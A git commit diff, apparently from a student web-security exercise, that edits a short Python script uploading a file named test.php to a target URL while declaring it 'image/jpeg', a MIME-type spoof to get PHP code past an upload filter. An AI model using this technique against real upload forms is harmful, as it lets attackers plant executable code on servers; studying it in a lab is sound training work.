96c4e84b60d2085854a2d3458f00d05d77334d80
Romain Kirszbaum <rkirszba@student.42.fr>
2021-06-11 16:20:53 +0200

    small modification

--- file_upload/Ressources/form.py
+++ file_upload/Ressources/form.py
@@ -8,8 +8,8 @@ DATA = {
 	'Upload': 'Upload'
 }
 
-FILE = [('uploaded', ('test.php', open('/Users/romainkirszbaum/Desktop/test.php', 'rb'), 'image/jpeg'))]
 
 if __name__ == '__main__':
 	BASE_URL = sys.argv[1]
+	FILE = [('uploaded', ('test.php', open(sys.argv[2], 'rb'), 'image/jpeg'))]
 	print(requests.post(BASE_URL, data=DATA, files=FILE, params=PARAMS).text)
